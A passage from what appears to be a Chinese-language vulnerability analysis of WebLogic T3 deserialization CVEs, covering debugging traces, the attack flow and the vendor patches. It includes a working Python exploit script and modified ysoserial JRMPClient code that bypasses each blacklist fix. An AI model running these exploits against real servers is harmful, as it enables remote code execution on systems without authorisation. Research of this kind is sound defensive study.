class="string">&#x27;000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371&#x27;</span></span><br><span class="line">    data2 = <span class="string">&#x27;007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000&#123;0&#125;ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;&#123;:04x&#125;&#x27;</span>.<span class="built_in">format</span>(dport))</span><br><span class="line">    data3 = <span class="string">&#x27;1a7727000d3234322e323134&#x27;</span></span><br><span class="line">    data4 = <span class="string">&#x27;2e312e32353461863d1d0000000078&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> [data1,data2,data3,data4]:</span><br><span class="line">        sock.send(d.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;send request payload successful,recv length:%d&#x27;</span>%(<span class="built_in">len</span>(sock.recv(<span class="number">2048</span>))))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_payload_objdata</span>(<span class="params">sock, data</span>):</span><br><span class="line">    payload=<span class="string">&#x27;056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000&#x27;</span></span><br><span class="line">    payload+=data</span><br><span class="line">    payload+=<span class="string">&#x27;fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff&#x27;</span></span><br><span class="line">    payload = <span class="string">&#x27;%s%s&#x27;</span>%(<span class="string">&#x27;&#123;:08x&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(payload)/<span class="number">2</span> + <span class="number">4</span>),payload)</span><br><span class="line">    sock.send(payload.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    sock.send(payload.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            res += sock.recv(<span class="number">4096</span>)</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client</span>):</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.settimeout(<span class="number">65</span>)</span><br><span class="line">    server_addr = (dip, dport)</span><br><span class="line">    t3_handshake(sock, server_addr)</span><br><span class="line">    build_t3_request_object(sock, dport)</span><br><span class="line">    payload = generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;payload: &quot;</span> + payload)</span><br><span class="line">    rs=send_payload_objdata(sock, payload)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;response: &#x27;</span> + rs)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;exploit completed!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment">#check for args, print usage if incorrect</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">7</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\nUsage:\nexploit.py [victim ip] [victim port] [path to ysoserial] &#x27;</span></span><br><span class="line">              <span class="string">&#x27;[JRMPListener ip] [JRMPListener port] [JRMPClient]\n&#x27;</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line">    dip = sys.argv[<span class="number">1</span>]</span><br><span class="line">    dport = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line">    path_ysoserial = sys.argv[<span class="number">3</span>]</span><br><span class="line">    jrmp_listener_ip = sys.argv[<span class="number">4</span>]</span><br><span class="line">    jrmp_listener_port = sys.argv[<span class="number">5</span>]</span><br><span class="line">    jrmp_client = sys.argv[<span class="number">6</span>]</span><br><span class="line">    exploit(dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client)</span><br><span class="line">            </span><br></pre></td></tr></table></figure>

<p>payloads.JRMPClient中payload的构造：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Registry <span class="title function_">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    String host;</span><br><span class="line">    <span class="type">int</span> port;</span><br><span class="line">    <span class="type">int</span> <span class="variable">sep</span> <span class="operator">=</span> command.indexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">        port = <span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(<span class="number">65535</span>);</span><br><span class="line">        host = command;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">        port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">    <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port);</span><br><span class="line">    <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line">    <span class="type">RemoteObjectInvocationHandler</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(ref);</span><br><span class="line">    <span class="type">Registry</span> <span class="variable">proxy</span> <span class="operator">=</span> (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">        Registry.class</span><br><span class="line">    &#125;, obj);</span><br><span class="line">    <span class="keyword">return</span> proxy;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>漏洞分析</strong>：<br>首先分析的是输入流中的类能否绕过resolveClass中的过滤，经过断点调试及ysoserial中payload的生成，最终输出流中包装的类java.rmi.server.RemoteObjectInvocationHandler不在黑名单中，故这种方式可绕过resolveClass的过滤<br>在命令最终执行得地方下断点，利用得CC1链，即在InvokerTransformer类的transform方法上下断点<br>函数调用栈：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">transform:<span class="number">119</span>, InvokerTransformer (org.apache.commons.collections.functors)</span><br><span class="line">transform:<span class="number">122</span>, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:<span class="number">157</span>, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">invoke:<span class="number">69</span>, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">entrySet:-<span class="number">1</span>, $Proxy74 (com.sun.proxy)</span><br><span class="line">readObject:<span class="number">346</span>, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">57</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">601</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1004</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">1891</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1796</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1348</span>, ObjectInputStream (java.io)</span><br><span class="line">defaultReadFields:<span class="number">1989</span>, ObjectInputStream (java.io)</span><br><span class="line">readSerialData:<span class="number">1913</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1796</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1348</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">370</span>, ObjectInputStream (java.io)</span><br><span class="line">executeCall:<span class="number">243</span>, StreamRemoteCall (sun.rmi.transport)</span><br><span class="line">invoke:<span class="number">377</span>, UnicastRef (sun.rmi.server)</span><br><span class="line">dirty:-<span class="number">1</span>, DGCImpl_Stub (sun.rmi.transport)</span><br><span class="line">makeDirtyCall:<span class="number">360</span>, DGCClient$EndpointEntry (sun.rmi.transport)</span><br><span class="line">registerRefs:<span class="number">303</span>, DGCClient$EndpointEntry (sun.rmi.transport)</span><br><span class="line">registerRefs:<span class="number">139</span>, DGCClient (sun.rmi.transport)</span><br><span class="line">read:<span class="number">312</span>, LiveRef (sun.rmi.transport)</span><br><span class="line">readExternal:<span class="number">491</span>, UnicastRef (sun.rmi.server)</span><br><span class="line">readObject:<span class="number">455</span>, RemoteObject (java.rmi.server)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">57</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">601</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1004</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">1891</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1796</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1348</span>, ObjectInputStream (java.io)</span><br><span class="line">defaultReadFields:<span class="number">1989</span>, ObjectInputStream (java.io)</span><br><span class="line">readSerialData:<span class="number">1913</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1796</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1348</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">370</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">69</span>, InboundMsgAbbrev (weblogic.rjvm)</span><br><span class="line">read:<span class="number">41</span>, InboundMsgAbbrev (weblogic.rjvm)</span><br><span class="line">readMsgAbbrevs:<span class="number">283</span>, MsgAbbrevJVMConnection (weblogic.rjvm)</span><br><span class="line">init:<span class="number">215</span>, MsgAbbrevInputStream (weblogic.rjvm)</span><br><span class="line">dispatch:<span class="number">498</span>, MsgAbbrevJVMConnection (weblogic.rjvm)</span><br><span class="line">dispatch:<span class="number">330</span>, MuxableSocketT3 (weblogic.rjvm.t3)</span><br><span class="line">dispatch:<span class="number">394</span>, BaseAbstractMuxableSocket (weblogic.socket)</span><br><span class="line">readReadySocketOnce:<span class="number">960</span>, SocketMuxer (weblogic.socket)</span><br><span class="line">readReadySocket:<span class="number">897</span>, SocketMuxer (weblogic.socket)</span><br><span class="line">processSockets:<span class="number">130</span>, PosixSocketMuxer (weblogic.socket)</span><br><span class="line">run:<span class="number">29</span>, SocketReaderRequest (weblogic.socket)</span><br><span class="line">execute:<span class="number">42</span>, SocketReaderRequest (weblogic.socket) </span><br><span class="line">execute:<span class="number">145</span>, ExecuteThread (weblogic.kernel)</span><br><span class="line">run:<span class="number">117</span>, ExecuteThread (weblogic.kernel)</span><br></pre></td></tr></table></figure>

<p>进入到InboundMsgAbbrev的readObject方法，这里对weblogic T3协议传过来的数据进行反序列化操作<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230811173049.png"><br>ServerChannelInputStream继承ObjectInputStream，继续往上查看调用readObject的地方，中间可以忽略ObjectInputStream readObject方法的底层执行，来到RemoteObject的readObject方法<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230811173609.png"><br>如果对ysoserial的JRMP模块进行分析过，就能够清楚了解后面的这条链<br>详细参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12780">https://xz.aliyun.com/t/12780</a><br><strong>大致流程</strong>：<br>从最开始到现在的漏洞，需要明白恶意的payload都是寄托在T3协议之上的，将恶意的payload通过T3协议发送给weblogic服务器，weblogic服务器会对其进行反序列化，但是在InboundMsgAbbrev的resolveClass方法中，会对payload中的类进行过滤，只要绕过了黑名单，恶意的payload就会反序列化导致命令执行<br>使用exploit.JRMPListener开启9999端口远程对象调用服务，对应的是CC1链构造的恶意payload1<br>使用python脚本与weblogic服务通信，发送由payloads.JRMPClient生成的payload2，payload2在weblogic反序列化后会与JRMPListener的9999端口请求，得到恶意的payload2后，反序列化后会导致命令的执行<br><strong>修复</strong>：<br>官方给出了p24667634_1036_Generic补丁，修复点还是添加黑名单<br>在InboundMsgAbbrev.ServerChannelInputStream中，对<code>java.rmi.registry.Registry</code>进行过滤</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveProxyClass(String[] interfaces) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">   String[] arr$ = interfaces;</span><br><span class="line">   <span class="type">int</span> <span class="variable">len$</span> <span class="operator">=</span> interfaces.length;</span><br><span class="line">   <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i$</span> <span class="operator">=</span> <span class="number">0</span>; i$ &lt; len$; ++i$) &#123;</span><br><span class="line">      <span class="type">String</span> <span class="variable">intf</span> <span class="operator">=</span> arr$[i$];</span><br><span class="line">      <span class="keyword">if</span>(intf.equals(<span class="string">&quot;java.rmi.registry.Registry&quot;</span>)) &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Unauthorized proxy deserialization&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="built_in">super</span>.resolveProxyClass(interfaces);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>参考</strong>：<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/14275298.html">Java 安全之Weblogic 2017-3248分析 - nice_0e3 - 博客园 (cnblogs.com)</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/225137">CVE-2017-3248——WebLogic反序列化初探-安全客 - 安全资讯平台 (anquanke.com)</a></p>
<h3 id="CVE-2018-2628"><a href="#CVE-2018-2628" class="headerlink" title="CVE-2018-2628"></a>CVE-2018-2628</h3><p>可以看到在cve-2017-3248中的补丁中，在resolveProxyClass方法中对<code>java.rmi.registry.Registry</code>进行了过滤。<br>在readObject底层操作中，存在两条路，一条是resolveClass，另一条是resolveProxyClass。当反序列化的是动态代理对象，就会走到resolveProxyClass方法中，如果取消Proxy的包装，就能够绕过resolveProxyClass方法<br><strong>绕过分析</strong><br>两种利用方式<br>第一：去除Proxy，修改payloads.JRMPClient生成payload</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Registry <span class="title function_">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    String host;</span><br><span class="line">    <span class="type">int</span> port;</span><br><span class="line">    <span class="type">int</span> <span class="variable">sep</span> <span class="operator">=</span> command.indexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">        port = <span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(<span class="number">65535</span>);</span><br><span class="line">        host = command;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">        port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">    <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port);</span><br><span class="line">    <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line">    <span class="comment">// 删除下面</span></span><br><span class="line">    <span class="comment">// RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);</span></span><br><span class="line">    <span class="comment">// Registry proxy = (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[] &#123;</span></span><br><span class="line">    <span class="comment">//     Registry.class</span></span><br><span class="line">    <span class="comment">// &#125;, obj);</span></span><br><span class="line">    <span class="comment">// return proxy;</span></span><br><span class="line">    <span class="comment">// 直接返回UnicastRef对象</span></span><br><span class="line">    <span class="keyword">return</span> ref;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>修改后打成jar包，然后按照cve-2017-3248的步骤即可利用<br>第二：使用java.rmi.activation.Activator远程接口<br>还是修改payloads.JRMPClient</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Registry <span class="title function_">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    String host;</span><br><span class="line">    <span class="type">int</span> port;</span><br><span class="line">    <span class="type">int</span> <span class="variable">sep</span> <span class="operator">=</span> command.indexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">        port = <span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(<span class="number">65535</span>);</span><br><span class="line">        host = command;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">        port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">    <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port);</span><br><span class="line">    <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line">    <span class="type">Activator</span> <span class="variable">proxy</span> <span class="operator">=</span> (Activator) Proxy.newProxyInstance(JRMPClient2.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">            Activator.class</span><br><span class="line">        &#125;, obj);</span><br><span class="line">    <span class="keyword">return</span> proxy;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>修复</strong>：<br>2018年发布的p27395085_1036_Generic<br>其补丁对<code>sun.rmi.server.UnicastRef</code>进行了过滤，具体位置在weblogic.utils.io.oif.WebLogicFilterConfig</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] DEFAULT_BLACKLIST_CLASSES = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;org.codehaus.groovy.runtime.ConvertedClosure&quot;</span>, <span class="string">&quot;org.codehaus.groovy.runtime.ConversionHandler&quot;</span>, <span class="string">&quot;org.codehaus.groovy.runtime.MethodClosure&quot;</span>, <span class="string">&quot;org.springframework.transaction.support.AbstractPlatformTransactionManager&quot;</span>, <span class="string">&quot;sun.rmi.server.UnicastRef&quot;</span>&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="CVE-2018-2893"><a href="#CVE-2018-2893" class="headerlink" title="CVE-2018-2893"></a>CVE-2018-2893</h3><p>由于在CVE-2018-2628的补丁后，对<code>sun.rmi.server.UnicastRef</code>进行了过滤，所以这里的绕过方式就是CVE-2016-0638与CVE-2017-3248的结合<br>修改payloads.JRMPClient<br>由于JDK中不存在StreamMessageImpl类，所以需要导入weblogic中的类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> weblogic.jms.common.StreamMessageImpl;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span> <span class="params">(<span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    String host;</span><br><span class="line">    <span class="type">int</span> port;</span><br><span class="line">    <span class="type">int</span> <span class="variable">sep</span> <span class="operator">=</span> command.indexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (sep &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        port = <span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(<span 